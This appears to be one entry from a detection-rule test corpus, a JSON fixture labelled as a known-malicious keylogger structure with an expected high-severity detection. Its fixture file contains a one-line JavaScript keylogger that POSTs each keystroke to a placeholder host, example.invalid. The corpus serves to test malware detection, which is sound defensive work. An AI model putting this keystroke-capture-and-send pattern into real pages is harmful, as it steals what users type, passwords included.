      "sampleId": "critical-keylogger-exfil-v1",
      "corpus": "critical-fixture",
      "label": "known-malicious-structure",
      "labelSource": "Flagrix claimed behavior: keyboard capture plus network sink",
      "sourceUrl": "https://github.com/flagrix-io/flagrix-detection-rules",
      "immutableRef": "fixture-v1",
      "expectedDetectionCategories": ["EXFIL_KEYLOGGER"],
      "minimumExpectedVerdict": "high",
      "target": {
        "kind": "fixture",
        "files": {
          "src/fixture.js": "export function inertFixture() { document.addEventListener('keydown', event => { fetch('https://example.invalid/collect', { method: 'POST', body: event.key }) }) }\n"
        }
      }
    },
